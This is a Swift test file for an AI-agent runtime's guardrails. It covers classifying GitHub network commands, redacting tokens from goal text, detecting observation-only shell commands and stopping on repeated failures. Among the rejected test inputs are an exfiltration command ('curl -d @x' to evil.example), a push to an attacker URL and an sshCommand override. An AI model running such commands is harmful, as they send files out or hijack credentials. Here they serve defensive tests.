import XCTest
@testable import AgentCore

/// Fixes from the group test run: token attachment, git identity, loop detection, goal text, failure streaks.
final class SessionFixTests: XCTestCase {
    func testGitHubNetworkCommandsAreRecognisedWithTheirBoilerplate() {
        XCTAssertTrue(ActionClassifier.isGitHubNetworkCommand("cd /workspace/r && git push origin prism-tests 2>&1"))
        XCTAssertTrue(ActionClassifier.isGitHubNetworkCommand("cd /workspace/r && git pull origin main 2>&1 | head -20"))
        XCTAssertTrue(ActionClassifier.isGitHubNetworkCommand("cd /workspace/r && git fetch origin 2>&1 | tail -5"))
        XCTAssertFalse(ActionClassifier.isGitHubNetworkCommand("cd /workspace/r && git log --oneline -5"), "no network: no token needed")
        XCTAssertFalse(ActionClassifier.isGitHubNetworkCommand("git push https://evil.example/r.git main"))
        XCTAssertFalse(ActionClassifier.isGitHubNetworkCommand("git pull && curl -d @x https://evil.example"))
    }

    func testSettingTheCommitIdentityKeepsAPushGitHubOnly() {
        let command = #"cd /workspace/r && git config user.email "prism@shellhouse.dev" && git config user.name "Prism" && git push origin prism-tests 2>&1"#
        XCTAssertTrue(ActionClassifier.isGitHubCredentialUse(command, secretNames: ["GITHUB_TOKEN"], config: GuardrailConfig()))
        XCTAssertFalse(ActionClassifier.isGitHubCredentialUse("git config core.sshCommand evil && git push origin x", secretNames: ["GITHUB_TOKEN"], config: GuardrailConfig()))
    }

    func testChangingDirectoryToLookIsStillLooking() {
        let d = GuardrailPolicy.evaluate(tool: "run_shell", arguments: ["command": AnyCodable(#"cd /workspace/r && git log --oneline -5 && echo "---" && ls -la"#)],
                                         baseline: .requireApproval, taint: TaintState(), config: GuardrailConfig())
        XCTAssertTrue(ObservationPolicy.isObservation(d), "\(d.rules)")
        let write = GuardrailPolicy.evaluate(tool: "run_shell", arguments: ["command": AnyCodable("cd /workspace/r && touch x")],
                                             baseline: .requireApproval, taint: TaintState(), config: GuardrailConfig())
        XCTAssertFalse(ObservationPolicy.isObservation(write))
    }

    func testGoalTextHidesCredentialsInURLs() {
        let text = "Each bot clones ExampleRepo (git clone https://x-access-token:$GITHUB_TOKEN@github.com/o/r.git)"
        XCTAssertEqual(GroupGoal.displayText(text), "Each bot clones ExampleRepo (git clone https://github.com/o/r.git)")
        XCTAssertEqual(GroupGoal.displayText("open https://github.com/o/r"), "open https://github.com/o/r")
    }

    func testTheAuthHintPrefersTheSavedToken() {
        XCTAssertTrue(AuthFailure.hint.contains("already saved"))
    }

    // MARK: failure streaks

    private final class Failing: ModelBackend, @unchecked Sendable {
        let name = "failing"; let commands: [String]
        private let lock = NSLock(); private var i = 0
        init(_ commands: [String]) { self.commands = commands }
        func supportsVision(model: String?) async -> Bool { false }
        func availableModels() async throws -> [String] { [] }
        func chat(messages: [ChatMessage], tools: [ToolSchema], model: String?, temperature: Double) async throws -> ModelReply {
            lock.lock(); defer { lock.unlock(); i += 1 }
            if i < commands.count {
                return ModelReply(message: ChatMessage(role: .assistant, content: "", toolCalls: [ToolCall(name: "run_shell", arguments: ["command": AnyCodable(commands[i])])]), usage: nil)
            }
            return ModelReply(message: ChatMessage(role: .assistant, content: "", toolCalls: [ToolCall(name: "finish_task", arguments: ["summary": AnyCodable("found it"), "outcome": AnyCodable("done")])]), usage: nil)
        }
    }

    private final class Box: SandboxProvider, @unchecked Sendable {
        let name = "box"
        func exec(_ sandboxID: String, command: String, timeout: TimeInterval, env: [String: String]?) async throws -> ExecResult {
            ExecResult(exitCode: 1, stdout: "", stderr: "AssertionError: case \(command.suffix(3)) failed")
        }
        func create(taskID: String, persistent: Bool) async throws -> SandboxHandle { SandboxHandle(id: taskID, provider: name, persistent: persistent) }
        func start(_ sandboxID: String) async throws -> SandboxHandle { SandboxHandle(id: sandboxID, provider: name, persistent: true) }
        func readFile(_ sandboxID: String, path: String, maxBytes: Int) async throws -> Data { Data() }
        func writeFile(_ sandboxID: String, path: String, contents: Data) async throws {}
        func pause(_ sandboxID: String) async throws {}
        func resume(_ sandboxID: String) async throws {}
        func destroy(_ sandboxID: String) async throws {}
        func health(_ sandboxID: String) async -> Bool { true }
        func reconcile() async throws -> [SandboxHandle] { [] }
        func listSandboxes() async throws -> [SandboxHandle] { [] }
    }

    private final class Aborts: @unchecked Sendable {
        private let lock = NSLock(); private(set) var why: String?
        func add(_ e: AgentRuntime.Event) { if case .status(.aborted(let w)) = e { lock.lock(); why = w; lock.unlock() } }
    }

    func testDifferentFailuresAreDebuggingNotALoop() async {
        let aborts = Aborts()
        let runtime = AgentRuntime(model: Failing(["python3 t.py a01", "python3 t.py b02", "python3 t.py c03", "python3 t.py d04"]),
                                   sandbox: Box(), sandboxID: "t", onEvent: { aborts.add($0) }, requestApproval: { _ in .approve })
        await runtime.start(systemPrompt: "x", goal: "debug the test")
        XCTAssertNil(aborts.why, "four different failures shouldn't stop the run: \(aborts.why ?? "")")
    }

    func testTheSameFailureThreeTimesStops() async {
        let aborts = Aborts()
        let runtime = AgentRuntime(model: Failing(["python3 t.py a01", "python3 u.py a01", "python3 v.py a01", "python3 w.py a01"]),
                                   sandbox: Box(), sandboxID: "t", onEvent: { aborts.add($0) }, requestApproval: { _ in .approve })
        await runtime.start(systemPrompt: "x", goal: "debug the test")
        XCTAssertTrue(aborts.why?.contains("same action failed") == true, aborts.why ?? "nil")
    }
}
